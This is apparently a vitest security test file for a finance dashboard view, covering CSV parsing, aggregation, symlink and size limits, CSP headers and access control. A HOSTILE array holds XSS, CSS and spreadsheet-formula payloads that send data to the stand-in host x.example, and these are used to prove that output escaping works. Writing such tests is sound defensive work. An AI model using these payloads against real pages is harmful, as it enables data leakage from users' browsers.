// FINANCETAB1013: the finance view. Three risks are pinned here. (1) The caller:
// the view carries company P&L and bank balances, and /api/* auth is one shared
// fleet token, so only a logged-in session on FINANCE_USERS may read it. (2) The
// files: the reader must not follow a symlink out of FINANCE_DIR and must cap
// sizes. (3) The output: the dashboard shows it in a sandboxed srcdoc iframe,
// which does NOT block resource loads, so no value may become markup (Viktor,
// msg 1868 F3).
import { describe, it, expect, vi } from 'vitest'
import { mkdtempSync, mkdirSync, writeFileSync, symlinkSync, realpathSync, readFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { tmpdir } from 'node:os'

const base = realpathSync(mkdtempSync(join(tmpdir(), 'marveen-finance-test-')))
const root = join(base, 'penzugy')
const outside = join(base, 'outside')
const projectRoot = join(base, 'project')
mkdirSync(join(root, 'acme'), { recursive: true })
mkdirSync(join(root, 'beta'), { recursive: true })
mkdirSync(join(root, 'Bad Name'), { recursive: true })
mkdirSync(outside, { recursive: true })
mkdirSync(projectRoot, { recursive: true })

// Synthetic data only.
writeFileSync(join(root, 'acme', 'pnl.csv'),
  'honap,kategoria,osszeg_huf,tipus,jeloles,forras\n' +
  '2026-08,bevetel,1000000,bevetel,teny,kivonat\n' +
  '2026-08,infra_saas,-250000,koltseg,teny,kivonat\n' +
  '2026-08,nem_eredmeny,300000,nem_eredmeny,teny,kivonat\n' +
  '2026-10,bevetel,500000,bevetel,teny,kivonat\n' +
  '2026-10,egyeb_koltseg,-100000,koltseg,tipp,kivonat\n' +
  '2026-13,bevetel,1,bevetel,teny,\n' +
  '2026-10,bevetel,12.5,bevetel,teny,\n' +
  '2026-10,bevetel,1,bevetel,talan,\n')
writeFileSync(join(root, 'acme', 'elorejelzes.csv'),
  '﻿honap;kategoria;osszeg_huf;forgatokonyv\r\n' +
  '2026-11;bevetel;800000;alap\r\n' +
  '2026-11;ber_jarulek;-300000;alap\r\n' +
  '2026-11;bevetel;400000;rossz\r\n' +
  '2026-11;ber_jarulek;-300000;rossz\r\n')
writeFileSync(join(root, 'acme', 'bank_projekcio.csv'),
  'datum,szamla_alias,egyenleg_huf,tenyleges,esemeny,forgatokonyv\n' +
  '2026-09-30,HUF,100000,true,,\n' +
  '2026-09-30,EUR,300000,true,,\n' +
  '2026-10-31,HUF,-50000,false,,rossz\n' +
  '2026-10-31,HUF,50000,false,,alap\n' +
  '2026-11-30,HUF,-200000,false,auto: lizing maradvanyertek,rossz\n' +
  '2026-11-30,HUF,20000,false,,alap\n' +
  '2026-11-30,EUR,100000,false,,rossz\n' +
  '2026-11-30,EUR,250000,false,,alap\n')
writeFileSync(join(root, 'acme', 'meta.json'), JSON.stringify({
  ceg: 'Acme <b>Kft.</b>', generalva: '2026-10-13T20:00:00+02:00', forrasok: ['kivonat'],
  szemlelet: 'pénzforgalmi, NEM számviteli', hianyzo_honapok: ['2026-09', 'nem-honap'],
  alap_feluliras: { infra_saas: 'kézi alapszint' }, figyelmeztetesek: ['Marabel-bevétel: adat hiányzik'],
  besorolatlan_tetelek: 2, egyeb_szamlak: [{ alias: 'NEM JELENHET MEG' }], elorejelzes_modszer: 'TIPP. medián',
}))
// beta: a symlinked file pointing outside, and an oversized file.
writeFileSync(join(outside, 'secret.csv'), 'honap,kategoria,osszeg_huf,tipus\n2026-01,TITOK,999,bevetel\n')
symlinkSync(join(outside, 'secret.csv'), join(root, 'beta', 'pnl.csv'))
writeFileSync(join(root, 'beta', 'elorejelzes.csv'), 'x'.repeat(1024 * 1024 + 1))
// a symlinked company directory pointing outside
mkdirSync(join(outside, 'evil'), { recursive: true })
writeFileSync(join(outside, 'evil', 'pnl.csv'), 'honap,kategoria,osszeg_huf,tipus\n2026-01,EVIL,1,bevetel\n')
symlinkSync(join(outside, 'evil'), join(root, 'evil'))

const envValues: Record<string, string> = { FINANCE_DIR: root, FINANCE_USERS: 'patrik, anna' }
vi.mock('../config.js', async (importOriginal) => ({ ...(await importOriginal<typeof import('../config.js')>()), PROJECT_ROOT: projectRoot }))
vi.mock('../env.js', () => ({ readEnvFile: () => ({ ...envValues }) }))
const logged: Array<[string, unknown, string]> = []
vi.mock('../logger.js', () => {
  const l: any = {
    info: (o: unknown, m: string) => logged.push(['info', o, m]),
    warn: (o: unknown, m: string) => logged.push(['warn', o, m]),
    error: () => {}, debug: () => {},
  }
  l.child = () => l
  return { logger: l }
})

const {
  parseCsv, readCapped, readMeta, listCompanies, loadCompany, loadAll, monthlyPnl, categoryTotals, forecastTable,
  bankLines, bankScenarios, summarizeLine, productCostTable, renderFinancePage, resolveFinanceRoot, TOTAL_ACCOUNT, FINANCE_DOC_CSP,
} = await import('../web/finance.js')
const { tryHandleFinance } = await import('../web/routes/finance.js')
type RouteContext = import('../web/routes/types.js').RouteContext

function fakeCtx(path: string, auth?: RouteContext['auth'], method = 'GET') {
  const out: { status: number; headers: Record<string, string>; body: string } = { status: 0, headers: {}, body: '' }
  const res = {
    writeHead(status: number, headers?: Record<string, string>) { out.status = status; out.headers = { ...(headers ?? {}) }; return res },
    end(chunk?: string) { if (chunk) out.body = chunk },
  }
  const url = new URL(`http://localhost:3420${path}`)
  const ctx = { req: { headers: {} } as RouteContext['req'], res, path: url.pathname, method, url, auth } as unknown as RouteContext
  return { ctx, out }
}

async function withEnv<T>(patch: Record<string, string>, fn: () => Promise<T>): Promise<T> {
  const saved = { ...envValues }
  Object.assign(envValues, patch)
  try { return await fn() } finally { Object.keys(envValues).forEach((k) => delete envValues[k]); Object.assign(envValues, saved) }
}

describe('parseCsv', () => {
  it('handles quotes, doubled quotes, embedded delimiters and newlines', () => {
    expect(parseCsv('a,b\n"x, y","say ""hi"""\n"multi\nline",z\n')).toEqual([
      ['a', 'b'], ['x, y', 'say "hi"'], ['multi\nline', 'z'],
    ])
  })
  it('picks ; for a Hungarian Excel header, drops the BOM, accepts CRLF', () => {
    expect(parseCsv('﻿a;b\r\n1;2\r\n')).toEqual([['a', 'b'], ['1', '2']])
  })
  it('keeps a formula-looking cell as plain text', () => {
    expect(parseCsv('a\n=HYPERLINK("x")\n')).toEqual([['a'], ['=HYPERLINK("x")']])
  })
})

describe('the file reader (containment)', () => {
  it('refuses a symlinked file, even one pointing at a valid CSV', () => {
    expect(readCapped(join(root, 'beta', 'pnl.csv'))).toEqual({ ok: false, reason: 'not_regular' })
  })
  it('refuses a file over 1 MB', () => {
    expect(readCapped(join(root, 'beta', 'elorejelzes.csv'))).toEqual({ ok: false, reason: 'too_large' })
  })
  it('a missing file is a missing section, not an error', () => {
    expect(loadCompany(root, 'beta').productCost).toEqual({ present: false, rows: [], errors: [] })
  })
  it('lists only plain directories with a safe name: no symlinked dir, no odd name', () => {
    expect(listCompanies(root)).toEqual(['acme', 'beta'])
  })
  it('nothing from outside the root reaches the page', () => {
    const html = renderFinancePage(loadAll(root), { lang: 'hu', theme: 'light' })
    expect(html).not.toContain('TITOK')
    expect(html).not.toContain('EVIL')
  })
  it('FINANCE_DIR unset or not a directory means off', () => {
    expect(resolveFinanceRoot('', projectRoot)).toBeNull()
    expect(resolveFinanceRoot(join(root, 'acme', 'pnl.csv'), projectRoot)).toBeNull()
    expect(resolveFinanceRoot(root, projectRoot)).toBe(root)
  })
})

describe('meta.json: only the known keys, as text', () => {
  const { meta } = readMeta(readFileSync(join(root, 'acme', 'meta.json'), 'utf8'))
  it('reads ceg as the name, the basis, warnings, overrides and the unclassified count', () => {
    expect(meta.name).toBe('Acme <b>Kft.</b>')
    expect(meta.basis).toBe('pénzforgalmi, NEM számviteli')
    expect(meta.warnings).toEqual(['Marabel-bevétel: adat hiányzik'])
    expect(meta.overrides).toEqual([{ key: 'infra_saas', reason: 'kézi alapszint' }])
    expect(meta.unclassified).toBe(2)
  })
  it('keeps only valid months in hianyzo_honapok', () => {
    expect(meta.missingMonths).toEqual(['2026-09'])
  })
  it('an unknown key never reaches the page', () => {
    expect(renderFinancePage(loadAll(root), { lang: 'hu', theme: 'light' })).not.toContain('NEM JELENHET MEG')
  })
  it('bad JSON and a non-object are errors, not crashes', () => {
    expect(readMeta('{').errors).toEqual(['meta.json nem érvényes JSON'])
    expect(readMeta('[1]').errors).toEqual(['meta.json nem objektum'])
  })
})

describe('validation and aggregation', () => {
  const acme = loadCompany(root, 'acme')
  it('skips invalid rows and says which line', () => {
    expect(acme.pnl.rows).toHaveLength(5)
    expect(acme.pnl.errors).toEqual([
      '7. sor: honap nem ÉÉÉÉ-HH', '8. sor: osszeg_huf nem egész szám', '9. sor: jeloles csak teny vagy tipp lehet',
    ])
  })
  it('monthly P&L: cost by magnitude, nem_eredmeny out of the result, a missing month is a gap', () => {
    expect(monthlyPnl(acme.pnl.rows, ['2026-09'])).toEqual([
      { month: '2026-08', missing: false, income: 1000000, cost: 250000, result: 750000, other: 300000, estimate: false },
      { month: '2026-09', missing: true, income: 0, cost: 0, result: 0, other: 0, estimate: false },
      { month: '2026-10', missing: false, income: 500000, cost: 100000, result: 400000, other: 0, estimate: true },
    ])
  })
  it('categories: per (category, kind), largest first, estimate flag kept', () => {
    expect(categoryTotals(acme.pnl.rows.filter((r) => r.month === '2026-10'))).toEqual([
      { category: 'bevetel', kind: 'bevetel', amount: 500000, estimate: false },
      { category: 'egyeb_koltseg', kind: 'koltseg', amount: 100000, estimate: true },
    ])
  })
  it('forecast: untyped rows with negative costs net correctly; no jeloles column means estimate', () => {
    const f = forecastTable(acme.forecast.rows)
    expect(f.scenarios).toEqual(['alap', 'rossz'])
    expect(f.cells.get('2026-11\u0000alap')).toEqual({ net: 500000, estimate: true })
    expect(f.cells.get('2026-11\u0000rossz')).toEqual({ net: 100000, estimate: true })
  })
  it('bank: scenarios, per-account lines, and a total that carries each account forward', () => {
    expect(bankScenarios(acme.bank.rows)).toEqual(['alap', 'rossz'])
    const lines = bankLines(acme.bank.rows)
    const total = (s: string) => lines.find((l) => l.account === TOTAL_ACCOUNT && l.scenario === s)!.points
    // 2026-10-31 has no EUR row: EUR carries its 09-30 actual balance.
    expect(total('rossz')).toEqual([
      { date: '2026-09-30', balance: 400000, actual: true },
      { date: '2026-10-31', balance: 250000, actual: false },
      { date: '2026-11-30', balance: -100000, actual: false },
    ])
    const huf = summarizeLine(lines.find((l) => l.account === 'HUF' && l.scenario === 'rossz')!)
    expect(huf.firstNegative?.date).toBe('2026-10-31')
    expect(summarizeLine(lines.find((l) => l.account === TOTAL_ACCOUNT && l.scenario === 'rossz')!).firstNegative?.date).toBe('2026-11-30')
    expect(summarizeLine(lines.find((l) => l.account === TOTAL_ACCOUNT && l.scenario === 'alap')!).firstNegative).toBeNull()
  })
  it('product cost: product x item x scenario in file order, estimate without a jeloles column, no sum', () => {
    writeFileSync(join(root, 'beta', 'marabel_termek_koltseg.csv'),
      'termek,tetel,osszeg_huf_per_egyseg,forgatokonyv\n' +
      'Konyv,netto_bevetel,10000,normal\nKonyv,valtozo_osszesen,4000,normal\nKonyv,fedezet,6000,normal\n' +
      'Konyv,netto_bevetel,10000,worst\nKonyv,valtozo_osszesen,12000,worst\nKonyv,fedezet,-2000,worst\n')
    const rows = loadCompany(root, 'beta').productCost.rows
    const t = productCostTable(rows)
    expect(t.products).toEqual([{ product: 'Konyv', items: ['netto_bevetel', 'valtozo_osszesen', 'fedezet'] }])
    expect(t.scenarios).toEqual(['normal', 'worst'])
    expect(t.cells.get('Konyv\u0000fedezet\u0000worst')).toEqual({ amount: -2000, estimate: true })
    const html = renderFinancePage([loadCompany(root, 'beta')], { lang: 'hu', theme: 'light' })
    expect(html).toContain('Fedezet')
    expect(html).toContain('<td class="num neg est">~-2')
    expect(html).not.toContain('Konyv: Összesen')
  })
  it('a missing required column is reported, no rows taken', () => {
    writeFileSync(join(root, 'beta', 'bank_projekcio.csv'), 'datum,egyenleg_huf\n2026-10-01,1\n')
    const c = loadCompany(root, 'beta')
    expect(c.bank.errors).toEqual(['hiányzó oszlop: szamla_alias, tenyleges'])
    expect(c.bank.rows).toEqual([])
  })
})

describe('rendering: output encoding (F3)', () => {
  const html = renderFinancePage(loadAll(root), { lang: 'hu', theme: 'dark' })
  it('shows the basis, the warning, the gap, the estimate marker and the one-off item', () => {
    expect(html).toContain('pénzforgalmi, NEM számviteli')
    expect(html).toContain('Marabel-bevétel: adat hiányzik')
    expect(html).toContain('nincs adat')
    expect(html).toMatch(/class="num est">~/)
    expect(html).toContain('auto: lizing maradvanyertek')
    expect(html).toContain('Infrastruktúra és SaaS')
  })
  it('carries its own CSP meta (a srcdoc does not get the response header)', () => {
    expect(html).toContain(`<meta http-equiv="Content-Security-Policy" content="${FINANCE_DOC_CSP.replace(/'/g, '&#39;')}">`)
    expect(FINANCE_DOC_CSP).toContain("default-src 'none'")
    expect(FINANCE_DOC_CSP).not.toMatch(/img-src|font-src|connect-src|script-src/)
  })

  // Hostile cells in every text field that reaches the page.
  const HOSTILE = [
    '<img src=//x.example/?leak>',
    '"><svg onload=alert(1)>',
    '</style><img src=x>',
    "' onmouseover='x",
    '=HYPERLINK("https://x.example/?"&A1,"y")',
    'a{background:url(//x.example/p)}',
  ]
  const evil = join(base, 'evilroot')
  mkdirSync(join(evil, 'co'), { recursive: true })
  const q = (s: string) => `"${s.replace(/"/g, '""')}"`
  writeFileSync(join(evil, 'co', 'pnl.csv'), 'honap,kategoria,osszeg_huf,tipus,jeloles,forras\n' +
    HOSTILE.map((h) => `2026-10,${q(h)},1,koltseg,teny,${q(h)}`).join('\n') + '\n')
  writeFileSync(join(evil, 'co', 'elorejelzes.csv'), 'honap,kategoria,osszeg_huf,forgatokonyv\n' +
    HOSTILE.map((h) => `2026-11,x,1,${q(h)}`).join('\n') + '\n')
  writeFileSync(join(evil, 'co', 'bank_projekcio.csv'), 'datum,szamla_alias,egyenleg_huf,tenyleges,esemeny,forgatokonyv\n' +
    HOSTILE.map((h, i) => `2026-10-0${i + 1},${q(h)},1,false,${q(h)},${q(h)}`).join('\n') + '\n')
  writeFileSync(join(evil, 'co', 'marabel_termek_koltseg.csv'), 'termek,tetel,osszeg_huf_per_egyseg,forgatokonyv\n' +
    HOSTILE.map((h) => `${q(h)},${q(h)},1,${q(h)}`).join('\n') + '\n')
  writeFileSync(join(evil, 'co', 'meta.json'), JSON.stringify({
    nev: HOSTILE[0], szemlelet: HOSTILE[1], megjegyzes: HOSTILE[2], generalva: HOSTILE[3],
    forrasok: HOSTILE, nem_szerepel: HOSTILE, figyelmeztetesek: HOSTILE, elorejelzes_modszer: HOSTILE[5],
    alap_feluliras: { [HOSTILE[1]!]: HOSTILE[0] },
  }))
  for (const lang of ['hu', 'en'] as const) {
    const out = renderFinancePage(loadAll(evil), { lang, theme: 'light' })
    it(`${lang}: no hostile value becomes markup`, () => {
      // Escaped text has no raw '<', so every <...> left is a real tag of ours.
      const tags = out.match(/<[^>]*>/g) ?? []
      const names = new Set(tags.map((t) => /^<\/?([a-z0-9]+)/i.exec(t)?.[1]?.toLowerCase() ?? '?'))
      for (const n of names) expect(['!doctype', 'html', 'head', 'meta', 'title', 'style', 'body', 'section', 'h2', 'h3', 'p', 'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td', 'svg', 'line', 'rect', 'text', 'polyline', 'details', 'summary', 'ul', 'li', 'span']).toContain(n === '?' ? '!doctype' : n)
      for (const t of tags) {
        expect(t).not.toMatch(/\son\w+\s*=/i)
        expect(t).not.toMatch(/\b(src|href|xlink:href|action|formaction|background|style)\s*=/i)
        expect(t).not.toMatch(/(https?:)?\/\//i)
      }
      // The only stylesheet is ours, and it loads nothing.
      expect(out.match(/<\/style>/g)).toHaveLength(1)
      const css = out.slice(out.indexOf('<style>'), out.indexOf('</style>'))
      expect(css).not.toMatch(/url\(|@import/i)
    })
    it(`${lang}: the hostile text is still visible, escaped`, () => {
      expect(out).toContain('&lt;img src=//x.example/?leak&gt;')
      expect(out).toContain('&quot;&gt;&lt;svg onload=alert(1)&gt;')
    })
  }
})

describe('the routes: caller gate', () => {
  const CRED_403 = { error: 'Forbidden for this credential type' }
  for (const [label, auth] of [
    ['the SHARED fleet token', { kind: 'token' }],
    ['the fleet token with an agent claim', { kind: 'token', agent: 'juro' }],
    ['a device key', { kind: 'device', device: 'phone', deviceId: 1, scope: 'full' }],
    ['an operator (Bridge) session, which resolves as device', { kind: 'device', device: 'bridge', deviceId: 2, scope: 'operator' }],
    ['a federation peer', { kind: 'federation', peer: 'x' }],
    ['no principal', undefined],
    ['an unknown future kind', { kind: 'kiosk' }],
  ] as const) {
    it(`refuses ${label}`, async () => {
      const { ctx, out } = fakeCtx('/api/finance/view', auth as unknown as RouteContext['auth'])
      expect(await tryHandleFinance(ctx)).toBe(true)
      expect(out.status).toBe(403)
      expect(JSON.parse(out.body)).toEqual(CRED_403)
    })
  }

  it('refuses a session whose user is not on FINANCE_USERS (e.g. one created with the fleet token)', async () => {
    const { ctx, out } = fakeCtx('/api/finance/view', { kind: 'session', user: 'newuser' })
    await tryHandleFinance(ctx)
    expect(out.status).toBe(403)
    expect(JSON.parse(out.body)).toEqual({ error: 'Forbidden for this user' })
  })

  it('FINANCE_USERS empty or unset: every session is refused (fail-closed)', async () => {
    await withEnv({ FINANCE_USERS: '' }, async () => {
      const { ctx, out } = fakeCtx('/api/finance/view', { kind: 'session', user: 'patrik' })
      await tryHandleFinance(ctx)
      expect(out.status).toBe(403)
    })
    await withEnv({ FINANCE_USERS: ' , ' }, async () => {
      const { ctx, out } = fakeCtx('/api/finance/view', { kind: 'session', user: '' })
      await tryHandleFinance(ctx)
      expect(out.status).toBe(403)
    })
  })

  it('the fleet token cannot tell whether the feature is configured (403 before 404)', async () => {
    await withEnv({ FINANCE_DIR: '' }, async () => {
      const { ctx, out } = fakeCtx('/api/finance/view', { kind: 'token' })
      await tryHandleFinance(ctx)
      expect(out.status).toBe(403)
    })
  })

  it('serves a listed session, with no-script, no-store, no-framing headers, and logs who and which companies only', async () => {
    logged.length = 0
    const { ctx, out } = fakeCtx('/api/finance/view?lang=en&theme=dark', { kind: 'session', user: 'patrik' })
    expect(await tryHandleFinance(ctx)).toBe(true)
    expect(out.status).toBe(200)
    expect(out.headers['Content-Type']).toBe('text/html; charset=utf-8')
    expect(out.headers['Cache-Control']).toBe('private, no-store')
    expect(out.headers['Content-Security-Policy']).toContain("default-src 'none'")
    expect(out.headers['Content-Security-Policy']).toContain("frame-ancestors 'self'")
    expect(out.headers['Content-Security-Policy']).not.toContain('script-src')
    expect(out.body).toContain('Monthly result')
    expect(logged).toEqual([['info', { user: 'patrik', companies: ['acme', 'beta'] }, 'finance view served']])
  })

  it('HEAD answers without a body', async () => {
    const { ctx, out } = fakeCtx('/api/finance/view', { kind: 'session', user: 'anna' }, 'HEAD')
    await tryHandleFinance(ctx)
    expect(out.status).toBe(200)
    expect(out.body).toBe('')
  })

  it('no write method exists', async () => {
    const { ctx, out } = fakeCtx('/api/finance/view', { kind: 'session', user: 'patrik' }, 'POST')
    await tryHandleFinance(ctx)
    expect(out.status).toBe(405)
  })

  it('a listed session with FINANCE_DIR unset gets 404 finance_disabled', async () => {
    await withEnv({ FINANCE_DIR: '' }, async () => {
      const { ctx, out } = fakeCtx('/api/finance/view', { kind: 'session', user: 'patrik' })
      await tryHandleFinance(ctx)
      expect(out.status).toBe(404)
      expect(JSON.parse(out.body)).toEqual({ error: 'finance_disabled' })
    })
  })

  it('config: only a boolean; on needs both FINANCE_DIR and FINANCE_USERS', async () => {
    const ask = async () => { const { ctx, out } = fakeCtx('/api/finance/config', { kind: 'token' }); await tryHandleFinance(ctx); return JSON.parse(out.body) }
    expect(await ask()).toEqual({ enabled: true })
    expect(await withEnv({ FINANCE_USERS: '' }, ask)).toEqual({ enabled: false })
    expect(await withEnv({ FINANCE_DIR: '' }, ask)).toEqual({ enabled: false })
  })

  it('other paths are not handled here', async () => {
    const { ctx } = fakeCtx('/api/finance/other', { kind: 'session', user: 'patrik' })
    expect(await tryHandleFinance(ctx)).toBe(false)
  })
})

describe('the dashboard side (static contract)', () => {
  const webDir = join(dirname(fileURLToPath(import.meta.url)), '..', '..', 'web')
  const app = readFileSync(join(webDir, 'app.js'), 'utf8')
  const html = readFileSync(join(webDir, 'index.html'), 'utf8')
  const loader = app.slice(app.indexOf('function loadFinance()'), app.indexOf('// VIDEOREVIEW1002: reveal the sidebar link'))

  it('the view is fetched with XHR, never through the wrapped fetch (which would attach the fleet token)', () => {
    expect(loader).toContain('new XMLHttpRequest()')
    expect(loader).not.toMatch(/\bfetch\(\s*[`'"]\/api\/finance\/view/)
    expect(loader).not.toContain('Authorization')
  })

  it('the HTML goes into an iframe with an EMPTY sandbox (no script, no same-origin)', () => {
    expect(loader).toContain("frame.setAttribute('sandbox', '')")
    expect(loader).not.toMatch(/allow-(scripts|same-origin)/)
    expect(loader).toContain('frame.srcdoc = xhr.responseText')
  })

  it('the sidebar link is hidden until the config says enabled, and sits in the stats group', () => {
    expect(html).toMatch(/data-page="finance" id="sbFinance" hidden/)
    expect(html).toContain('id="financePage"')
    expect(app).toContain("pages: ['costs', 'finance', 'tokenUsage']")
  })
})
